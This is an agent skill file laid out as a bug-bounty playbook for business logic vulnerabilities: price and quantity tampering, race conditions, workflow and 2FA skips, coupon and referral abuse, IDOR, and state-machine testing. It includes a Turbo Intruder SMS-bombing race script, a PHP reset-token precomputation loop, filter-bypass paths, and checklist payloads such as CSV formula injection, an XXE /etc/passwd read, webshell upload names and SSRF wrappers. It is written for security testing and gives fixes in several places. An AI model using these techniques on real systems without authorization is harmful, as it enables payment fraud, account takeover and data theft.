---
name: business-logic-vulnerabilities
description: >-
  Business logic vulnerability playbook. Use when reasoning about workflows, race conditions, price manipulation, coupon abuse, state machines, and multi-step authorization gaps.
---

# SKILL: Business Logic Vulnerabilities — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Business logic flaws are scanner-invisible and high-reward on bug bounty. This skill covers race conditions, price manipulation, workflow bypass, coupon/referral abuse, negative values, and state machine attacks. These require human reasoning, not automation. For specific exploitation techniques (payment precision/overflow, captcha bypass, password reset flaws, user enumeration), load the companion [SCENARIOS.md](./SCENARIOS.md). For the workflow approach itself (modeling → state machine → attack-surface matrix → human judgement) load [METHODOLOGY.md](./METHODOLOGY.md). For the per-module check items load [CHECKLIST.md](./CHECKLIST.md).

## 0. RELATED ROUTING

- [race-condition](../race-condition/SKILL.md) — the concurrency deepening for every double-spend and limit-overrun case in §2
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) — the ownership-check failure behind the cookie-replacement and resource-ID cases in §5 and §7
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) — object and function authorization for the API-shape logic flaws in §6
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — the full upload attack workflow behind §8
- [business-logic-vuln](../business-logic-vuln/SKILL.md) — the compact router entry into this domain
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — how a workflow bypass and its projected loss are presented

---

### Companion files

| File | When to load |
|---|---|
| [METHODOLOGY.md](./METHODOLOGY.md) | Need the 5-phase workflow, attack-surface 5×N matrix, human-judgement decision tree |
| [CHECKLIST.md](./CHECKLIST.md) | Going through a target module-by-module (login / register / payment / IDOR / privacy) and want every line item with why+verify |
| [SCENARIOS.md](./SCENARIOS.md) | Drilling deeper into payment precision/overflow, captcha bypass, password reset, enumeration, frontend bypass |

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Payment precision & integer overflow attacks — 32-bit overflow to negative, decimal rounding exploitation, negative shipping fees
- Payment parameter tampering checklist — price, discount, currency, gateway, return_url fields
- Condition race practical patterns — parallel coupon application, gift card double-spend with Burp group send
- Captcha bypass techniques — drop verification request, remove parameter, clear cookies to reset counter, OCR with tesseract
- Arbitrary password reset — predictable tokens (`md5(username)`), session replacement attack, registration overwrite
- User information enumeration — login error message difference, masked data reconstruction across endpoints, base64 uid cookie manipulation
- Frontend restriction bypass — array parameters for multiple coupons (`couponid[0]`/`couponid[1]`), remove `disabled`/`readonly` attributes
- Application-layer DoS patterns — regex backtracking, WebSocket abuse

---

## 1. PRICE AND VALUE MANIPULATION

### Negative Quantity / Price
Many applications validate "amount > 0" but not for currency:
```
Add to cart with quantity: -1
Update quantity to: -100
{
  "quantity": -5,
  "price": -99.99     ← may be accepted
}
```
**Impact**: Receive credit to account, items for free, bank transfers in reverse.

### Decimal Quantity — "0元购" Case
Real instructor-led case: an e-commerce app accepted **fractional `quantity`** because backend trusted client float values:
```json
// Cart item:
{"id": 114016, "skuQty": 0.02}
// Original price ¥500 → final price ¥10
// Variant on a food delivery app:
// FoodNum=0.01 → 68元 商品 实付 0.68元
```
Why it works: server multiplies `unit_price * quantity` without enforcing `quantity ∈ Z+`, so a 2% sliver order pays 2% price but ships the full item. Reproduce by intercepting the cart submit → setting `skuQty` / `FoodNum` to `0.02` → finishing checkout.

### Drop a Required Field — Free Tier Coercion
Sport activity registration: when paid prizes are involved server returns `"payType": "paid"`; if the client request is **edited to omit `prizeIdList` entirely**, the server falls back to `"payType": "free"` and creates a successful registration that should have cost money.
```json
// Original
{"prizeIdList": ["6264e6948fe587000113e2d9"], ...}
// Modified — array removed entirely
{"prizeIdList": [], ...}
// Server response:
{"ok": true, "payType": "free"}
```
This is a parameter-existence trust bug — backend treats "field absent" as "no paid item to enforce", so fix is to require the field and validate its content server-side.

### Integer Overflow
```
quantity: 2147483648   ← INT_MAX + 1 overflows to negative in 32-bit
price: 9999999999999   ← exceeds float precision → rounds to 0
```
Real case: setting `amount=999999999` triggered an overflow path where the system stored `0` as final payable. **Always coordinate before triggering overflow tests** — they sometimes crash payment services.

### Rounding Manipulation
```
Item price: $0.001
Order 1000 items → each rounds down → total = $0.00
```
Real "half-price recharge" bug: input `¥0.019` to top-up. The pay gateway charges only `¥0.01` (rounded down to the cent), but the wallet credits `¥0.02` (rounded up). Net gain per cycle is `¥0.01`, repeat for free balance growth.

### Currency Exchange Rate Lag
```
1. Deposit using currency A at rate X
2. Rate changes
3. Withdraw using currency A at new rate → profit from rate difference
```

### Free Upgrade via Promo Stacking
Test combining discount codes, referral credits, welcome bonuses:
```
Apply promo: FREE50  → 50% off
Apply promo: REFER10 → additional 10%
Apply loyalty points → additional discount
Total: -$5 (free + credit)
```

---

## 2. RACE CONDITIONS

**Concept**: Two operations run simultaneously before the first completes its check-update cycle.

### Double-Spend / Double-Redeem
```bash
# Send same request simultaneously (~millisecond apart):
# Use Burp Repeater "Send to Group" or Race Conditions tool:

POST /api/use-coupon    ← send 20 parallel requests
POST /api/redeem-gift   ← same coupon code, parallel
POST /api/withdraw-funds ← same balance, parallel

# If check and update are non-atomic:
# Thread 1: check(balance >= 100) → TRUE
# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)
# Thread 1: balance -= 100
# Thread 2: balance -= 100 → BOTH succeed → double-spend
```

### Race Condition Test with Burp Suite
```
1. Capture request
2. Send to Repeater → duplicate 20+ times
3. "Send group in parallel" (Burp 2023+)
4. Check: did any duplicate succeed?
```

### Turbo Intruder — Bypassing Per-Number SMS Rate Limit
Real case: when a normal request returns `"该号码短时间内申请发送短信次数过多，拒绝发送"`, sending the **same payload** with high concurrency through Turbo Intruder defeats the simple counter:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```
Result: the per-phone limiter races and many requests slip through, generating multiple distinct verification codes (a real SMS-bombing case). Root cause: counter increment is non-atomic vs. the read.

### Multi-Device Concurrent VIP Subscription
Real case: a service offers **first-month-only discount**. Open the pay sheet on multiple devices (A, B, C) before any payment finishes, then complete each in sequence. Server only checks "is new user?" at the **first** request, so all subsequent requests inherit the discount AND the VIP duration stacks.
```
Normal: 下单 → 支付 → 充值会员 → 第二次下单 → 服务端校验 "已是新人" → 拒绝
Bypass: 设备A: 进入支付页 (锁定优惠资格)
        设备B: 进入支付页 (并发锁定)
        设备A: 完成支付 → VIP +1月 (优惠价)
        设备B: 完成支付 → VIP +1月 (仍按优惠价)
```
Same trick works on "补差价升级会员" — concurrent top-ups duplicate the duration credit.

### Account Registration Race
```
Register with same email simultaneously → two accounts created → data isolation broken
Password reset token race → reuse same token twice
Email verification race → verify multiple email addresses
```

### Limit Bypass via Race
```
"Claim once" discounts, freebies, "first order" bonus:
→ Send 10 parallel POST /claim requests
→ Race window: all pass the "already claimed?" check before any write
```

---

## 3. WORKFLOW / STEP SKIP BYPASS

### Payment Flow Bypass
```
Normal flow:
  1. Add to cart
  2. Enter shipping info
  3. Enter payment (card/wallet)
  4. Click confirm → payment charged
  5. Order confirmed

Attack: Skip to step 5 directly
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ Does server trust client-sent payment_status?
```

### Multi-Step Verification Skip
```
Password reset flow:
  1. Enter email
  2. Receive token
  3. Enter token
  4. Set new password (requires valid token from step 3)

Attack: Try going to step 4 without completing step 3:
POST /reset/password {"email": "victim@x.com", "token": "invalid", "new_pass": "hacked"}
→ Does server check that token was properly validated?

Or: Try token from old/expired flow → still accepted?
```

### 2FA Bypass
```
Normal flow:
  1. Enter username + password → success
  2. Enter 2FA code → logged in

Attack: After step 1 success, go directly to /dashboard
→ Is session created before 2FA completes?
→ Does /dashboard require 2FA-complete check or just "authenticated" flag?
```

### Filter Path Truncation Bypass — `..//` and `;`

Real case from a Java Web class audit: a manually-implemented Servlet `Filter` checks login by inspecting the URI string. Two reliable bypasses:

```
Path-traversal truncation (../):
  Protected:   http://target/FilterDemo/index.jsp        → 302 to /login
  Bypass:      http://target/FilterDemo/../../index.jsp  → 200 (filter sees "../../", URL parser collapses)

Semicolon truncation (;):
  Protected:   http://target/admin/doLogin.action        → 302 to /login
  Bypass:      http://target/;/admin/doLogin.action      → 200
                              ^
                              Servlet container treats segment after ; as "path parameter",
                              filter that uses request.getRequestURI() sees "/;/admin/doLogin.action",
                              doesn't match its protected-prefix "/admin/", lets the request through,
                              but the dispatcher then routes to the real /admin/doLogin.action handler.
```

**Fix**: never use `request.getRequestURI()` for security checks; use `request.getServletPath()` which is the normalized servlet-mapped path:
```java
// Vulnerable
String uri = request.getRequestURI();   // /;/admin/doLogin.action
// Safe
String path = request.getServletPath(); // /admin/doLogin.action
```

When auditing Java code, grep for `request.getRequestURI()` paired with `Filter`/`startsWith`/`indexOf("/admin")` patterns — those are immediate red flags.

### Real-Name Verification Replay-To-Reset

Fraudulent path that deliberately fails real-name authentication to **reopen** the editing flow:
```
1. Submit real-name auth with intentionally wrong cardNumber
   → server returns "code:200, msg:success, ok:true" but flow shows "驳回 / 等待审核"
2. Because the server marks state as "rejected" but doesn't lock the user, the UI lets the
   account go back into the "edit identity" state
3. Now resubmit with another (possibly stolen) identity
   → real-name binding repeats indefinitely, defeating anti-addiction lock and enabling account resale
```
Defense: rejected real-name submissions must lock the account / require human review, not loop back to the editor.

### Shipping Without Payment
```
  1. Add item to cart
  2. Enter shipping address
  3. Select payment method (credit card)
  4. Apply promo code (100% discount or gift card)  
  5. Final amount: $0
  6. Order placed

Attack: Apply 100% discount code → no actual payment processed → item ships
```

---

## 4. COUPON AND REFERRAL ABUSE

### Coupon Stacking
```
Test: Can you apply multiple coupon codes?
Test: Does "SAVE20" + promo stack to >100%?
Test: Apply coupon, remove item, keep discount applied, add different item
```

### Referral Loop
```
1. Create Account_A
2. Register Account_B with Account_A's referral code → both get credit
3. Create Account_C with Account_B's referral code
4. Ad infinitum with throwaway emails
→ Infinite credit generation
```

### Coupon = Fixed Dollar Amount on Variable-Price Item
```
Coupon: -$5 off any order
Buy item worth $3, use -$5 coupon → net -$2 (credit balance)
```

---

## 5. ACCOUNT / PRIVILEGE LOGIC FLAWS

### Email Verification Bypass
```
1. Register with email A (legitimate, verified)
2. Change email to B (attacker's email, unverified)
3. Use account as verified — does server enforce re-verification?

Or: Change email to victim's email → no verification → account claim
```

### Password Reset Token Binding
```
1. Request password reset for your account → get token
2. Change your email address (account settings)
3. Reuse old password reset token → does it still work for old email?

Or: Request reset for victim@target.com
    Token sent to victim but check: does URL reveal predictable token pattern?
```

### OAuth Account Linking Abuse
```
1. Have victim's email (but not their password)
2. Register with victim's email → get account with same email
3. Link OAuth (Google/GitHub) to your account
4. Victim logs in with Google → server finds email match → merges with YOUR account
```

### Cookie Replacement — Horizontal/Vertical Privilege Escalation

The textbook IDOR demo from the audit videos:
```
1. Login as super-admin → capture request, copy Cookie (JSESSIONID/Token)
2. Logout, login as plain user → capture another request to the SAME endpoint
3. Replay the plain-user request, but swap the Cookie value with the admin's token
4. If the response returns admin-only data → vertical escalation
   If it returns another-user's data → horizontal escalation
```
A common companion bug: `/oa/emp/list` returns **HTTP 302 to /login when no cookie**, but **200 with full data when any plain-user cookie is sent** — meaning the only check is "logged in?", not "authorized for this endpoint".

### Permission Residue from Database Inconsistency

A subtle case from the second audit class: the admin UI shows that role X has had permission `user:list` revoked, but querying the SQL data:

```sql
SELECT * FROM sys_menu WHERE role_id = 2;
-- two rows for the same menu_id "user:list"
```

The UI's "remove permission" only deleted ONE row; the duplicate row keeps the API accessible. Verify by:
```sql
SELECT menu_id, COUNT(*) FROM sys_menu GROUP BY menu_id, role_id HAVING COUNT(*) > 1;
```

Lesson: when a UI says permission revoked but API still works → check the underlying RBAC table for duplicates / orphaned grants.

### Weak-Random Password Reset Token

PHP / legacy stack on Windows uses `rand()` whose `RAND_MAX = 32768`. If a reset link uses
`/resetpassword.php?id=md5(rand())`, the entire keyspace is precomputable:
```php
$a = 0;
for ($a = 0; $a <= 32768; $a++) {
    $b = md5($a);
    echo $b . "\r\n";
}
```
Iterate the resulting dictionary against `/resetpassword.php?id=<hash>` — when one returns a valid reset page you can change the victim's password. Audit any token generation that ultimately calls `rand()`, `mt_rand()` (without seeding), `Random()` (default seed in C#), etc.

---

## 6. API BUSINESS LOGIC FLAWS

### Object State Manipulation
```
order.status = "pending"
→ PUT /api/orders/1234 {"status": "refunded"}   ← self-trigger refund
→ PUT /api/orders/1234 {"status": "shipped"}    ← mark as shipped without shipping
```

### Transaction Reuse
```
1. Initiate payment → get transaction_id
2. Complete purchase
3. Reuse same transaction_id for second purchase:
   POST /api/checkout {"transaction_id": "USED_TX", "cart": "new_cart"}
```

### Limit Count Manipulation
```
Daily transfer limit = $1000
→ Transfer $999, cancel, transfer $999 (limit not updated on cancel)
→ Parallel transfers (race condition on limit check)
→ Different payment types not sharing limit counter
```

### Java Web "No Filter, No Spring Security" Anti-Pattern

Audit-friendly tell: a Spring Boot project that does **NOT** include `spring-boot-starter-security` and has zero `Filter` classes. This means every controller is wide-open for `guest` unless the developer manually checked the session in each method. Reproduce:
```bash
# Inside the source tree
find . -name "*.java" -exec grep -l "Filter" {} \;     # likely empty
find . -name "*.java" -exec grep -l "@PreAuthorize\|@Secured" {} \;
```
If both are empty, expect almost every API to be unauthorized. From the audit demo:
```java
public Result score(@RequestParam("userId") Integer userId) {
    Score score = scoreService.selectScoreByUserId(userId);
    return Result.success(score);
}
```
No check that `userId` matches the session's logged-in user → horizontal IDOR. Worse: the same endpoint works **without any Cookie**, since nothing forces authentication globally.

### Spring Security `antMatchers` Coverage Gap

The audit videos also showed a partially-secured Spring Security config like:
```java
.antMatchers("/system/user/info").authenticated()
.antMatchers("/system/menu/**").hasRole("admin")
```
A common error is an over-narrow rule — e.g. `/system/user/info` is protected but `/system/user/list` is not, or `/system/menu/**` is admin-only but `/system/dept/treeData` is open. Cross-check the controller annotations (`@PreAuthorize("@ss.hasPermi('system:user:list')")`) against the SecurityConfig — every annotated endpoint must also map to a SecurityConfig rule. Mismatches are common after refactors.

---

## 7. SUBSCRIPTION / TIER CONFUSION

```
Free tier: cannot access feature X
Paid tier: can access feature X

Attack: 
- Sign up for paid trial → enable feature X → downgrade to free
  → Does feature X get disabled on downgrade? 
  → Can you continue using feature X?

Or:
- Inspect premium endpoint list from JS bundle
- Directly call premium endpoints with free account token
→ Server checks subscription for UI but not API?
```

### Direct Media URL Leak — VIP Resource Bypass

Real cases from a fitness/learning app: when the client requests course detail, the JSON response embeds the raw media URL:
```http
GET /gerudo/v2/liveCourse/625020ce8f002700010554c1/detail HTTP/1.1
{
  "previewPullUrl": "http://app-live.../live/app-live_625020ce8f002700010554c2_Preview.flv"
  ...
}
```
Search **all** detail / preview / playback responses for keywords:
```
.flv  .m3u8  .mp4  .mp3  videoUrl  downloadUrl  streamUrl  previewPullUrl
```
For each hit, replay the URL anonymously (curl, VLC, flv.js demo at `https://bilibili.github.io/flv.js/demo/`). If the URL plays without a session, you've broken VIP gating. Defense: use signed, short-TTL URLs bound to user/IP/Referer, not raw resource paths.

### Resource ID Replacement — Free → Paid Course

Companion bug: free course detail returns `{"id": "60caa21e853f5c1651b27c1b", ...}`. Replace the ID in the URL with a known paid course ID. If the response structure remains the same and includes the playable URL → IDOR on premium content. Defense: verify the **owner relation** on each detail call, not just "is logged-in".

---

## 8. FILE UPLOAD BUSINESS LOGIC

For the full upload attack workflow beyond pure logic flaws, also load:

- [upload insecure files](../upload-insecure-files/SKILL.md)

```
Upload size limit: 10MB
→ Upload 10MB → compress client-side → server decompresses → bomb?
(Zip bomb: 1KB zip → 1GB file = denial of service)

Upload type restriction:
→ Upload .csv for "data import" → inject formulas: =SYSTEM("calc")
  (CSV injection in Excel macro context)
→ Upload avatar → server converts → attack converter (ImageMagick, FFmpeg CVEs)

Storage path prediction:
→ /uploads/USER_ID/filename
→ Can you overwrite other user's file by knowing their ID + filename?
```

---

## 9. TESTING APPROACH

```
For each business process:
1. Map the INTENDED flow (happy path)
2. Ask: "What if I skip step N?"
3. Ask: "What if I send negative/zero/MAX values?"
4. Ask: "What if I repeat this step twice?" (idempotency)
5. Ask: "What happens if I do A then B instead of B then A?"
6. Ask: "What if two users do this simultaneously?"
7. Ask: "Can I modify the 'trusted' status fields?"
8. Think from financial/resource impact angle → highest bounty
```

For the formal 5-phase workflow — Business Modeling → State Machine → Attack-Surface Matrix → Checklist-Driven Testing → Human Judgement — load **[METHODOLOGY.md](./METHODOLOGY.md)**. It includes a single-page decision tree (`Q1 ~ Q7`) for "I'm staring at a request and don't know what to try first".

---

## 10. HIGH-IMPACT CHECKLISTS

For the full per-module list (login / register / password recovery / payment / coupon / order / IDOR / privacy / VIP / URL redirect / cookie & token / race / comments) with `why` and `verify` columns — load **[CHECKLIST.md](./CHECKLIST.md)**.

The condensed top-impact items below are the "if you have only 30 minutes, hit these first" set:

### E-commerce / Payment
```
□ Negative quantity / decimal quantity (skuQty=0.02, FoodNum=0.01) in cart
□ Drop required fields (delete prizeIdList) to coerce free tier
□ amount=999999999 integer overflow → final 0
□ Apply multiple conflicting coupons via array params
□ Race condition: double-spend gift card / same coupon
□ Skip payment step directly to order confirmation  
□ Server-trusted client status fields (payment_status=paid, success:true)
□ Refund without return (trigger refund on delivered item via state change)
□ Multi-device concurrent VIP subscription / 补差价升级
□ Currency rounding exploitation (¥0.019 charge → ¥0.02 wallet credit)
```

### Authentication / Account
```
□ 2FA bypass by direct URL access after password step
□ Filter bypass: ../../path traversal truncation, ;path-parameter truncation
□ Password reset token reuse after email change
□ Weak random reset token: md5(rand()) on Windows PHP, predictable seed
□ Email verification bypass (change email after verification)
□ OAuth account takeover via email match
□ Register with existing unverified email
□ Cookie replacement (admin → user / user → another user)
□ Real-name verification "故意填错" replay-to-reset
```

### Subscriptions / Limits / Resources
```
□ Access premium features after downgrade
□ Exceed rate/usage limits via parallel requests (Turbo Intruder)
□ Referral loop for infinite credits
□ Free trial ≠ time-limited (no enforcement after trial)
□ Direct API call to premium endpoint without subscription check
□ Free-course ID swap to paid-course ID (IDOR on resource)
□ Direct media URL exposure in JSON (.flv / .m3u8 / .mp4 in response)
□ Server-side RBAC residue (sys_menu duplicate rows)
□ Java Web no-Filter / Spring Security antMatchers gap
```

---

## 11. CONSOLIDATED CHECKLIST (2-Hour Full Sweep)

The Section 10 list is the "30-minute money grab". This list is the next layer:
when you have a couple of hours and want a defensive-grade sweep across all
nine business surfaces. It's organized by surface, then by attack mechanism
inside the surface, so you can read a column-down for "what classes of bug
might exist on this endpoint" and a row-across for "where else does this
attack apply".

For full `item / why / verify` triplets including reproduction steps and
tooling per item, load **[CHECKLIST.md](./CHECKLIST.md)**. This section
keeps only the item line for fast scanning.

### 11.1 Login / Authentication
```
□ Username enumeration via response diff (msg / status code / timing)
□ Username enumeration via SMS-send response (sent vs not-registered)
□ Brute force without lockout (no rate limit on failed login)
□ Default / weak credentials (admin/admin, root/123456) on backend & infra
□ 2FA bypass via direct URL after password step / replay 2FA token
□ Client-trusted login flag (status=success, is_login=true in response body)
□ Third-party / SSO callback IDOR (modify uid in callback to take over)
□ Biometric liveness bypass (replay static photo / pre-recorded video)
□ Open redirect in login/register (return_url, redirect, callback param)
□ Hardware-key signature replay / forgery (USB-Key, PKI cert)
```

### 11.2 Registration
```
□ Username / phone / email enumeration via "already exists" response
□ Password strength only enforced client-side (set 123456 server-side)
□ Skip multi-step registration (POST final step directly, miss email verify)
□ Verification code not enforced (empty / random / fixed value passes)
□ SMS / email code replay (same code used twice or across users)
□ Re-register same username after logout, inherit old data / privileges
□ Anti-fraud bypass via N similar virtual accounts (same device, diff email)
□ Mass-register replay-protection missing (no nonce on submit step)
```

### 11.3 Password Recovery / Reset
```
□ Reset target tampering (uid / email / phone in submit step)
□ Reset token predictable (timestamp-derived, weak hash, short random)
□ Cross-user token reuse (A's reset_token, change B's password)
□ Old-password check missing on logged-in change-password endpoint
□ Skip code-verify step, hit final reset endpoint directly
□ Reset link / answer / token leaked in HTML or JS source
□ Reset token has no expiry / not invalidated after use
□ Reset code base64-only "obfuscated" in response
□ Inconsistent identity across multi-step flow (reset_token from step 2
  reusable in step 4)
□ Old session not revoked after email/phone re-bind
```

### 11.4 Session / Token
```
□ Session fixation: pre-login session id remains valid after login
□ Token not bound to user/IP/device (steal cookie → use anywhere)
□ Forged token: weak algorithm md5(username + timestamp), no server salt
□ Stale token still accepted after logout / expiry (no blacklist)
□ Cookie tampering (uid / role / is_admin in cookie trusted server-side)
□ State-machine replay (replay "claim red packet" → re-claim)
□ Anti-replay missing on one-time tokens (CSRF token, OTP, nonce)
□ Sensitive credentials (token, answer, key) hardcoded in front-end JS
□ Privileged session created from public Session ID without re-auth
□ Token works cross-environment (different IP, different UA, no validation)
```

### 11.5 Payment / Order
```
□ Amount tampering: amount = 0.01 / 0 / negative / 0.001
□ Quantity tampering: quantity = -1 / 0.01 / 1.5 / 999999999
□ Integer overflow: quantity * price wraps to 0 or negative
□ Floating-point precision exploit (multi-decimal, accumulated rounding)
□ Currency code swap (CNY → JPY/RUB at same numeric value)
□ Coupon / discount field forge (coupon_id, discount=, free_shipping=true)
□ Item ID swap: replace product_id with cheaper SKU at checkout
□ Signature / sign-field bypass (drop sign param, use stale sign)
□ Payment-callback forgery (status=paid posted to internal callback)
□ Replay paid request → multiple shipments / multiple credit
□ Race / concurrency: oversell, double-spend gift card, double redeem coupon
□ Refund without losing the merchandise / virtual rights
□ VIP duration tampering (days=999, months=120, period=-1)
□ Receiver-account redirect (merchant_id / receiver_account swap on withdraw)
□ Negative shipping / fee fields decreasing total (shipping_fee = -500)
□ Concurrent topup-then-refund draining (refund > topup in race window)
□ Pricing rule transition window (price changes at T, replay at T-ε with old rule)
□ Currency rounding micro-arbitrage (charge 0.019 → wallet credit 0.02)
□ Multi-channel inconsistency (online vs cash-on-delivery vs balance pay)
```

### 11.6 IDOR / Authorization
```
□ Horizontal IDOR: uid / order_id / resource_id swap to victim's
□ Vertical IDOR: role / type / level field set to admin in request
□ Hidden field tampering (data-user-id in HTML / JS state)
□ Email / phone re-bind without verifying old binding
□ UID vs session-token consistency missing (token belongs to A, uid sent as B)
□ Predictable / sequential resource IDs (gift IDs, share-link IDs)
□ Resource enumeration on order / coupon / share / trip-detail endpoint
□ Multi-entry inconsistency: web blocks, mobile API doesn't
□ State-machine illegal transition (claim reward without paying / shipping
  before order paid)
□ Hidden / undocumented admin endpoint accessible without admin auth
□ Cross-role function call (user calls merchant API, rider API, etc.)
□ Privilege via concurrent action (request role-elevation race condition)
```

### 11.7 CAPTCHA / Verification Code
```
□ Code returned in plaintext in HTTP response (body / header / JS var)
□ Receiver tampering: change phone / email param to attacker-controlled
□ Empty / fixed code accepted (000000, blank, "test")
□ Drop the code field entirely → request still succeeds
□ Cross-account reuse (A's valid code accepted on B's flow)
□ One-time enforcement missing (same code reusable until expiry)
□ Brute force 4-6 digit code (no attempt limit, no lockout)
□ SMS / email bombing (no rate limit per IP / per phone / no graphical CAPTCHA)
□ Front-end-only "send-success" status (server says fail, FE says success)
□ Code not bound to session (code generated for A, used in B's session)
```

### 11.8 File Upload
```
□ Content-Type bypass (Content-Type: image/jpeg, body is PHP)
□ Extension trick: double ext (.php.jpg), case mix (.Php), null byte, ;path
□ Filename path traversal (filename=../../webshell.php)
□ File-content polyglot (image with embedded PHP / shell)
□ Office XML repack (unzip docx → inject XML → rezip → upload)
□ XXE via .xml / .dtd upload endpoint
□ Backend-only upload (admin login → upload → exec)
□ Upload race: upload + parallel access before AV scan / cleanup
□ ZIP bomb (1KB → 1GB on server, decompress DoS)
□ CSV formula injection (=SYSTEM("calc"), =cmd|'/c calc'!A1)
□ Storage path predictable / overwritable across users (/uploads/UID/file)
□ Image converter / parser CVE (ImageMagick, FFmpeg, pillow)
```

### 11.9 CSRF / SSRF / XXE
```
□ XXE file read (<!ENTITY x SYSTEM "file:///etc/passwd">)
□ XXE blind via OOB (parameter entity → DNSLog / Burp Collaborator)
□ SSRF via image-import / webhook / preview URL (file://, http://127.0.0.1)
□ SSRF via FTP / gopher / jar / php-wrapper / dict protocols
□ XML parser dangerous wrappers enabled (php://expect, expect://)
□ Out-of-band detection for blind injection (DNSLog confirms server hit)
□ CSRF on state-changing endpoint (no token, no SameSite, no origin check)
□ Payment / withdrawal CSRF via auto-submitting hidden form
□ Login CSRF (force victim to log into attacker account)
□ JSONP / JSONP-callback exploitation as CSRF read primitive
```

### How to Use This Section

1. Print or screenshot the relevant 1-2 sub-sections for the target's surface.
2. For each `□` mark: NOT-APPLICABLE / NOT-VULN / VULN / NEEDS-RECHECK.
3. Mark the EXACT endpoint + parameter + payload that proved the bug
   (or proved it absent), so the report is reproducible.
4. Cross-reference with `METHODOLOGY.md` Q1~Q7 decision tree when an item
   triggers something unexpected — the tree tells you which neighboring
   items are likely also vulnerable.
5. For deep payloads / curl-ready commands / Burp screenshots per item,
   load `CHECKLIST.md` (full triplets) and `SCENARIOS.md` (real cases).

---

## 12. NUMERIC AND TYPE BOUNDARY ATTACKS

Business logic dies at the edges of its own arithmetic. Every `quantity`, `amount`, `rate`,
and `duration` field is a numeric boundary, and every boundary is an authorization boundary
the developer did not know they had.

### 12.1 Value classes to send

For each numeric parameter, walk this ladder rather than guessing:

```
0             -0            -1            -0.01
0.001         0.009         0.019         -0.001
1.5           0.02          0.99
2147483647    2147483648    -2147483648   4294967296
9223372036854775807        9223372036854775808
1e3          1e-3          0x10          "10"        "1e3"
"0010"       "1 0"         "10 "         ""          null        []
```

**A field that accepts `"10"` (a string) where a number is expected is a type-confusion
surface.** In PHP and loosely-typed Java binders, `"10abc"` may coerce to `10`, `"1e3"` to
`1000`, and `[]` to `0`. Each coercion is a different code path, and the validation almost
certainly ran on the other one.

### 12.2 Negative values that *reduce* a total

```
quantity: -1          → unit_price * -1 = a credit, not a charge
shipping_fee: -500    → the shipping line lowers the order total
discount: -99         → a negative discount applied twice
gift_card_amount: -100 → the "top-up" becomes a withdrawal
```

### 12.3 Off-by-one at a boundary

```
"Buy 10 get 1 free"     → send 9 or 11; does the rule use `>` where it needed `>=`?
"First order only"      → the counter increments before or after the check?
"Max 3 items"           → send exactly 3, then 4, then 3 again after removing one
"Free over $50"         → $49.99 / $50.00 / $50.01 with a coupon that changes the total
"Valid for 24 hours"    → 23:59:59, 24:00:00, and 24:00:01
"Expires tonight"       → test at the boundary in the target's timezone, not yours
```

**Boundaries are timezone-sensitive and DST-sensitive.** A rule evaluated at `00:00` local
can be replayed an hour later during a DST transition.

### 12.4 Rounding, precision, and truncation

```
1. Charge is computed on the rounded value, credit on the unrounded one.
2. The gateway floors to the cent; the ledger rounds half-up.  → the ¥0.019 → ¥0.02 case
3. Percentage discounts applied per line rather than to the subtotal.
4. A 3-decimal currency (KWD, BHD, TND) processed through a 2-decimal code path.
5. Integer division on a per-unit basis, multiplied back up afterwards.
```

**Test the rounding direction on both sides of the transaction.** The bug lives where the
charge and the credit disagree, not in either calculation alone.

### 12.5 Currency and unit confusion

```
CNY → JPY at the same numeric value     → 100 CNY becomes 100 JPY (≈ 1/20th)
Minor-unit vs major-unit mismatch       → 1000 (mills) written as 1000.00
Currency code dropped from the request  → server defaults to a weak currency
Comma vs dot decimal separator          → "1,50" parsed as 150
```

Send the amount, the currency, and the minor-unit field **independently**. If the server
accepts a currency that is not the account's own, the numeric value may never be re-rated.

---

## 13. STATE MACHINE AND WORKFLOW MODELLING

Business logic is a state machine the developer drew on a whiteboard and the API does not
enforce. Model it before you test it.

### 13.1 Recover the intended machine

1. Walk the happy path with a proxy and record **every** request in order. That sequence — not the UI copy — is the intended machine.
2. Name each state by the artefact it produces: `cart_created`, `shipping_set`, `payment_initiated`, `paid`, `fulfilled`, `refunded`.
3. For every recorded request, write the transition it represents.

### 13.2 Build the reachability matrix

For every `(state, transition)` pair, whether or not the UI offers it:

| | cart | ship | pay | fulfil | refund |
|---|---|---|---|---|---|
| **created** | — | UI | **TEST** | **TEST** | **TEST** |
| **paid** | — | **TEST** | — | UI | **TEST** |
| **fulfilled** | — | — | **TEST** | — | **TEST** |
| **refunded** | **TEST** | **TEST** | **TEST** | **TEST** | — |

Cells marked `TEST` are transitions the API accepts but no screen offers. They are the
finding surface. Two questions per cell:

- **Does the endpoint exist and accept the transition from this state?**
- **Is the resulting state consistent with the money that actually moved?**

### 13.3 Illegal-transition classes

```
Backwards      refunded → shipped, cancelled → paid
Skipping       created → fulfilled (no payment)
Repeating      fulfil twice against one payment; refund twice
Out-of-order   refund before capture; ship before authorization
Parallel       two transitions from the same state with one source of truth
Cross-object   apply an idempotency key from order A to order B
```

### 13.4 The idempotency and replay check

For every state-changing endpoint, send the **identical request twice**:

```
First send  → 200 + state change + a new resource id
Second send → should be 409 / 200-no-op / the SAME resource id
```

If the second send produces a second state change, idempotency is missing. Pair it with a
concurrency test — a race is the non-sequential form of the same bug.

### 13.5 Modelling output to keep

Write the machine down and ship it with the finding. A table of `(state, request, accepted?,
expected?)` is far more convincing than a prose description, and it makes the missing
transition trivially visible to the reviewer.

---

## 14. HUMAN-JUDGEMENT DECISION TREE

The skill so far is technique. This is how to apply it without burning a day on the wrong
surface. Answer the questions in order; each one narrows the next.

| # | Question | If yes | If no |
|---|---|---|---|
| **Q1** | Does the flow move **money** (charge, refund, transfer, credit, payout)? | Highest bounty class. Go to Q4 and Q5 immediately. | Go to Q2 |
| **Q2** | Does the flow move **privilege** (register, verify, reset, bind, role, invite)? | Account takeover class. Test every step's `uid`/`email`/`token` param for tampering. | Go to Q3 |
